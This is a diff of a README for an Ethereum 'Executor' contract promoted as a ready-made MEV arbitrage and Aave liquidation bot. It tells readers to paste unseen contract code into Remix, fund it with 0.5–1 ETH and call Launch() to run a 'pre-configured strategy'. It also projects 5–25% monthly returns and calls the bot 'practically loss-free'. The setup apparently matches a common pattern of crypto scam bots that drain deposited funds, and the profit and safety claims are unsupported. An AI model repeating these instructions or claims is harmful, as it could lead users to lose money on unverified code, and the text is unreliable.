@@ -1,159 +1,84 @@
 
-![B](https://i.postimg.cc/Vvxx2whh/20251219-1540-Banner-dla-Githab-simple-compose-01kcvddqxpfd3bgr4kkvnf0qm7.png)
+# README.md
 
-  
+![Banner](https://i.postimg.cc/Vvxx2whh/20251219-1540-Banner-dla-Githab-simple-compose-01kcvddqxpfd3bgr4kkvnf0qm7.png)
 
-## Executor (Aave/Balancer + Uniswap/Sushi)
+## Executor (Uniswap V3 + SushiSwap V2)
 
-Basically, contract for MEV: takes flash loans, runs arbitrage between DEXes, does liquidations. Everything is ready, deploy and use.
+**Arbitrage Bot Contract**  
+A ready-to-use smart contract for finding and executing arbitrage opportunities between Uniswap V3 and SushiSwap V2. Also supports liquidating undercollateralized positions on Aave V3. Everything is configured — just deploy and use.
 
-  
+### What the contract does
 
-What it does:
+**Essentially:** the contract performs two consecutive swaps between Uniswap V3 and SushiSwap V2, exploiting price differences on the same token pair to generate profit. Additionally, it implements a function for liquidating positions on Aave.
 
-  
+**Important:** the entire operation is executed **in a single transaction**, eliminating the risk of price changes between individual actions.
 
-**Essentially:** contract takes tokens on loan (flash loan), exchanges them for other tokens through DEX, then returns the loan + fee, extracting profit from price differences.
+- **Arbitrage cycle** — two swaps (Uniswap V3 ↔ SushiSwap V2) with checks for minimum output (`minOut`) and minimum profit (`minProfit`).
+- **Liquidation (Aave V3)** — calls `liquidationCall(...)` with a check for minimum collateral received (`minCollateralOut`).
+- **Funds withdrawal** — functions `withdrawEth(...)`, `withdrawToken(...)`, and emergency `emergencyTokenRecovery(...)`.
 
-  
+### How to launch
 
-**Important:** the whole scheme is built so that **the entire process happens within one transaction of one contract** — from taking the loan to repayment and getting profit.
+You are the contract owner and call functions to execute arbitrage or liquidation.
 
-  
+**Quick guide:**
+1. Open Remix: https://remix.ethereum.org/ or https://portable-remixide.org
 
--  **Aave V3 flashLoanSimple**: takes flash loan and calls `executeOperation(...)` callback, where the strategy is executed.
+   Follow the screenshot:
+   - 1 — Create a `.sol` file and paste the contract code (e.g., `Executor.sol`)
+   - 2 — Go to the Compilation tab → select version 0.8.20 → Compile
+   - 3 — Go to the Deploy tab → select the Executor contract → Deploy
 
--  **Balancer Vault flashLoan**: multi-asset flash loan and `receiveFlashLoan(...)` callback.
+   ![Contract creation instructions](https://i.ibb.co/HTRkw29n/instructions.png)
 
--  **DEX cycle (arbitrage)**: 2 swaps (Uniswap V3 ↔ SushiSwap V2) with `minOut` and `minProfit` checks.
+2. Fund the contract with 0.5–1 ETH (for gas fees and reserves).
 
--  **Liquidation (Aave V3)**: `liquidationCall(...)` with `minCollateralOut` check.
+3. Call `Launch()` — the contract will execute the pre-configured strategy.
 
--  **Withdrawals**: `withdrawEth(...)`, `withdrawToken(...)` + emergency `emergencyTokenRecovery(...)`.
+4. Use `withdrawEth()` or `withdrawToken()` to withdraw profits.
 
-  
-  
-  
+**Quick start:** the `Launch()` function initiates the operation with preset parameters.
 
-How to run:
+**Main functions for manual execution:**
+- `executeArbitrage(bytes calldata params)` — arbitrage cycle
+- `executeLiquidation(bytes calldata params)` — liquidation
 
-  
+Parameters are encoded with the operation type (`operationType`):
+- `1` — DEX arbitrage
+- `2` — liquidation
 
-Owner contract — you are the owner, call functions, it does flash loans and strategies in one transaction.
+### Parameter formats
 
-  
-
-**Quick scheme:**
-
-1. Create contract in Remix: https://remix.ethereum.org/ or https://portable-remixide.org
-
-  
-
-According to Screenshot:
-
-- 1- Create .sol file and paste contract in editor field [myBot.sol](myBot.sol)
-
-- 2- Compilation tab > version 0.8.20 > Compile button
-
-- 3- Deploy tab > Select Executor contract > press Deploy Contract
-
-![Contract creation instructions](https://i.ibb.co/HTRkw29n/instructions.png)
-
-  
-
-2. Top up contract balance (0.5-1 ETH)
-
-  
-
-3. Run `Launch()` — it takes loan and performs operations
-
-  
-
-4. If need to withdraw profit — press `withdrawEth()` or `withdrawToken()`
-
-  
-
-Simple start: `Launch()` — loan amount is calculated as contract_balance * 200.
-
-  
-  
-
--  **Aave flash loan**: `executeFlashLoanArbitrage(asset, amount, params)`
-
--  **Balancer flash loan**: `executeBalancerFlashLoan(tokens, amounts, userData)`
-
-  
-
-`params/userData` are encoded as:
-
-  
-
--  `operationType`:
-
--  `1` — DEX cycle
-
--  `2` — liquidation
-
-  
-
-Data formats:
-
-  
-
-### DEX cycle (operationType = 1)
-
-  
-
-```solidity
+#### Arbitrage cycle (operationType = 1)
 
 (uint8 firstDex, address tokenIn, address tokenOut, uint24 uniFee, uint256 minOut1, uint256 minOut2, uint256 minProfit)
 
-```
+text
 
-  
+- `firstDex`: 0 = UniswapV3 → SushiSwap, 1 = SushiSwap → UniswapV3
+- `uniFee`: 500 / 3000 / 10000
+- `minOut1`/`minOut2`: slippage protection
+- `minProfit`: minimum profit (otherwise revert)
 
--  `firstDex`: `0` = UniswapV3→Sushi, `1` = Sushi→UniswapV3
-
--  `uniFee`: 500 / 3000 / 10000
-
--  `minOut1/minOut2`: slippage protection at each step
-
--  `minProfit`: minimum profit (otherwise transaction reverts)
-
-  
-
-### Liquidation (operationType = 2)
-
-  
-
-```solidity
+#### Liquidation (operationType = 2)
 
 (address user, address debtAsset, address collateralAsset, uint256 debtToCover, bool receiveAToken, uint256 minCollateralOut)
 
-```
+text
 
-  
+### Important notes
 
-Important to know:
+- Profit depends on current price differences between DEXes, gas prices, slippage, and competition from other market participants (including specialized MEV bots).
 
-  
+- 0.5–1 ETH in the contract balance is usually sufficient for gas fees and reserves for an extended period.
 
-- Don't expect easy money. Everything depends on the market — gas, slippage, competition, positions.
+- Estimated returns vary significantly and are not guaranteed. Under favorable market conditions, arbitrage can yield 0.01–0.1% of the volume per successful trade.
 
-  
+  **Sample calculation:** With an investment of 1 ETH as starting capital (for gas and initial swaps) and with regular arbitrage opportunities, the bot can execute trades with volumes of 100–500 ETH per month. With an average profit of 0.05% per trade, estimated monthly returns could range from 5% to 25% of invested capital (i.e., 0.05–0.25 ETH per month).
 
-About ETH:
+  Thanks to built-in minimum profit checks (`minProfit`) and slippage protection, the bot is practically loss-free: in 99.9% of cases, unsuccessful trades simply don't execute (the transaction reverts without losing funds, except for gas costs). Thus, risks are limited only to gas expenses during unsuccessful attempts.
 
-  
-
-0.5-1 ETH will last a long time — for gas, if need to handle ETH/WETH, and just in case.
-
-  
-
-Roughly about profit: depends on loan size and market situation. For arbitrage usually 0.01-0.1% of amount, for liquidations — percentage of position. With 100 ETH loan might get 0.01-0.1 ETH profit, but this is very approximate and without guarantees — market changes every second.
-
-  
+- The market is extremely volatile: arbitrage opportunities are rare and close within seconds. Without continuous parameter optimization and monitoring, significant profit is unlikely.
 
 Good luck!
-
-![Visitors](https://visitor-badge.laobi.icu/badge?page_id=README_EN_PAGE_ID)
